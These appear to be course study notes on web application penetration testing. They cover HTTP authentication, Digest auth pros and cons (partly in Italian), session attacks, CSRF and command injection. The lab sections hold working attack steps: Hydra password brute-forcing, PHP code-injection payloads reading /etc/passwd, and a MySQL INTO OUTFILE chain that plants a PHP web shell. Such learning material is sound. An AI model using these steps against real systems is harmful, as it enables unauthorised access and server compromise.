
```

### Topic OverView:
+ HTTP Method & Authentication Testing
+ Sensitive Data Exposure
+ Broken Authentication Attacks (Attacking Login Forms, Bypassing Authentication etc)
+ Session Security Testing (Session Hijacking, Session Fixation & CSRF)
+ Injection & Input Validation Attacks (Command Injection, Code Injection)
+ Testing For Security Misconfigurations
+ Exploiting Vulnerable & Outdated Components



### Learning Objectives:
+ You will be able to perform HTTP method tampering.
+ You have the ability to attack sites using Basic HTTP Authentication and HTTP Digest Authentication.
+ You will have an understanding of what causes sensitive data exposure vulnerabilities.
+ You will have the ability to perform authentication testing in the form of attacking login forms and bypassing authentication.
+ You will have an understanding of how session management works and the role tokens and cookies play in session management and security
+ You will be able to identify and exploit session hijacking, session fixation and CSRF vulnerabilities.
+ You will be able to identify and exploit command injection and code injection vulnerabilities.
+ You will be able to identify and exploit security misconfigurations in web servers and other outdated and vulnerable components.

```


```
### HTTP Method Tampering:
> Change HTTP Method to optain different behaviour of the applications

```

```
### Authentication


## Basic Authentication:
Es. Authorization: Basic username:password (Encode in Base64)


## Basic Authentication - LAB:
- Cracking Auth Basic with Hydra
> hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.209.143.3 http-get /basic/
[ Retrieve "username": admin & "password":cookie1]

Accessing /basic/ using curl using the credentials retrieved using hydra: 
Command: curl -u admin:cookie1 192.209.143.3/basic/



## Digest Authentication:
> Server Response:
WWW-Authenticate: Digest realm="Example", qop="auth", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", opaque="5ccc069c403ebaf9f0171e9517f40e41"

● realm: A descriptive string indicating the protection space (usually the name of the application or service). 
● qop (Quality of Protection): Specifies the quality of protection. Commonly set to "auth." 
● nonce: A unique string generated by the server for each request to prevent replay attacks.
● opaque: An opaque value set by the server, which the client must return unchanged in the response.


> Client Response: The client constructs a response using the following components:
○ Username
○ Realm
○ Password
○ Nonce
○ Request URI (the path to the protected resource)
○ HTTP method (e.g., GET, POST)
○ cnonce (a client-generated nonce)
○ qop (the quality of protection)
○ H(A1) and H(A2), which are hashed values derived from the components

Authorization: Digest username="user", realm="Example", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", uri="/resource", qop=auth, nc=00000001, cnonce="0a4f113b", response="6629fae49393a05397450978507c4ef1", opaque="5ccc069c403ebaf9f0171e9517f40e41"

Validation Authorization Digest:
> Server Validation: The server receives the request with the Authorization header and validates the response hash calculated by the client. It does this by reconstructing the same components and calculating its own response hash.
> If the hashes match, the server considers the client authenticated and grants access to the requested resource.
> La password non viene utilizzata direttamente nel digest, ma piuttosto HA1 = MD5(nomeutente:realm:password). Ciò consente ad alcune implementazioni (ad esempio JBoss) di memorizzare HA1 anziché la password in chiaro.


### Digest Authentication - Vantaggi/Svantaggi:

Vantaggi:
L'autenticazione del digest HTTP è progettata per essere più sicura rispetto ai tradizionali schemi di autenticazione del digest, ad esempio "significativamente più potente di (ad esempio) CRAM-MD5 ...".
Alcuni dei punti di forza della sicurezza dell'autenticazione digest HTTP sono:

- La password non viene inviata in chiaro al server.
- La password non viene utilizzata direttamente nel digest, ma piuttosto HA1 = MD5(nomeutente:realm:password). Ciò consente ad alcune implementazioni (ad esempio JBoss [11] ) di memorizzare HA1 anziché la password in chiaro (tuttavia, vedere gli svantaggi di questo approccio)
- Il client nonce è stato introdotto nella RFC 2617, che consente al client di prevenire attacchi con testo in chiaro scelto , come le tabelle arcobaleno che potrebbero altrimenti minacciare gli schemi di autenticazione del digest
- Il nonce del server può contenere timestamp. Pertanto, il server può controllare gli attributi nonce inviati dai client, per prevenire attacchi di replay
- Il server può inoltre mantenere un elenco di valori nonce del server emessi o utilizzati di recente per impedirne il riutilizzo
- Previene il phishing perché la password semplice non viene mai inviata a nessun server, sia esso corretto o meno. (I sistemi a chiave pubblica si basano sulla capacità dell'utente di verificare che l'URL sia corretto.)

Svantaggi: 
Esistono diversi inconvenienti con l'autenticazione dell'accesso digest:
- Il sito web non ha alcun controllo sull'interfaccia utente presentata all'utente finale.
- Molte delle opzioni di sicurezza nella RFC 2617 sono facoltative. Se la qualità di protezione (qop) non è specificata dal server, il client funzionerà in una modalità RFC 2069 legacy con sicurezza ridotta
- L'autenticazione dell'accesso digest è vulnerabile a un attacco man-in-the-middle (MITM) . Ad esempio, un utente malintenzionato MITM potrebbe chiedere ai client di utilizzare l'autenticazione di accesso di base o la modalità di autenticazione di accesso digest RFC2069 legacy. Per estenderlo ulteriormente, l'autenticazione dell'accesso digest non fornisce alcun meccanismo che consenta ai client di verificare l'identità del server
- Un server può memorizzare HA1 = MD5(nome utente:realm:password) invece della password stessa. Tuttavia, se l'HA1 archiviato viene divulgato, un utente malintenzionato può generare risposte valide e accedere ai documenti nel realm con la stessa facilità come se avesse accesso alla password stessa. La tabella dei valori HA1 deve quindi essere protetta con la stessa sicurezza di un file contenente password in chiaro. [12]
- L'autenticazione dell'accesso digest impedisce l'uso di un hash di password complesso (come bcrypt ) durante l'archiviazione delle password (poiché la password o il nome utente, il realm e la password digest devono essere recuperabili)

Inoltre, poiché l' algoritmo MD5 non è consentito in FIPS , l'autenticazione HTTP Digest non funzionerà con i moduli crittografici certificati FIPS.





## Digest Authentication - LAB:

- Cracking Digest using Hydra:
> hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.209.143.3 http-get /digest/

[login: admin     password: adminpasswd]


Accessing /digest/ using curl using the credentials retrieved using hydra:
Command: curl --digest -u admin:adminpasswd 192.209.143.3/digest/


```

```

### Sensitive Data Exposure


## Weak Password Storage
Storing passwords in plaintext or using weak hashing algorithms without salting, making it easier for attackers to retrieve user passwords from a compromised database.


## Information Disclosure
Revealing sensitive data, such as system paths, database details, or user credentials, in error messages or logs that could aid attackers in exploiting the system.


## Directory Traversal
Allowing users to manipulate file paths in requests to access files and directories outside their intended scope, potentially exposing sensitive files.


## Unencrypted Backups
Storing backups of sensitive data without encryption or proper access controls, making them vulnerable if they are stolen.


```

```
### Authentication


## OTP Security
- Time Based OTP: Valid for a short duration
- SMS Based OTP: Sent to users via SMS messages.
- Rate Limit and Lockout: Prevent bruteforce on OTP with restriction of limit OTP verification. 

```


```
### Session Management



## Session Management Components:
- Session Identifier: A unique token is assigned to each user's session.
- Session Data: Information related user's session (auth status, user preferences, temp data), stored on the server
- Session Cookies: Session Cookies contain the session ID. It serve various purposes such as session management, user tracking, and personalization.


## Session Management - PHP:
- Session Start:
"session_start()" function initializes the session and generates a unique session ID.

- Session Data: 
$_SESSION - store and retrieve session data
Es. $_SESSION ['username'] = 'john_doe' : stores the username in the session.

- Session Timeout: 
session.gc_maxlifetime - THe session timeout is defined in the PHP configuration file (php.ini).

- Session ID Management:
By default PHP handles the generation of session IDs and their association with users.



## Session Fixation Testing:
Setting a known session ID user's identifier (controlled by attacker) to a known value of the attacker's choice.
Es. 
"Sending the victim a link that includes the fixed session token".
"Predicting or guessing the session token".
"Intercepting session token - man in the middle".
"Manipulating the victim into clicking on a specially crafted URL".

## Session Hijacking Testing:
Capture and reuse another user's session ID with "Session Prediction", "Session Sniffing", "Cross Site Scripting".

## Session ID Brute-Force:
Bruteforce session ID 

```



```
### Cross Site Request Forgery - CSRF

## CSRF is a type of web security vulnerability that occurs when an attacker tricks a user into performing actions on a web application without their knowledge or consent.

```


```
### Command Injection

## Command injection vulnerabilities in the context of web application penetration testing occur when an attacker can manipulate the input fields of a web application in a way that allows them to execute arbitrary operating system commands on the underlying server.



## PHP Code Injection - LAB:
hello;system('id')
hello;phpinfo()
hello;system('ps aux')
hello;system(%27cat%20/etc/passwd%27)

## RCE - MySQL Injection - LAB
> Whyppalizer
> nmap scripts
> nmap --script mysql-empty-password -p 3306 192.173.248.3
[Empty Password]
> mysql -u root -h 192.173.248.3

[Writing a file in /tmp directory]
> select 'Hello world' into outfile '/tmp/temp' from mysql.user limit 1;

[Writing a PHP web shell into the web root directory]
> select '<?php $output=shell_exec($_GET["cmd"]);echo
"<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1;

[Access the PHP web shell and pass the command to be executed in "cmd" parameter]
> /shell.php?cmd=id

```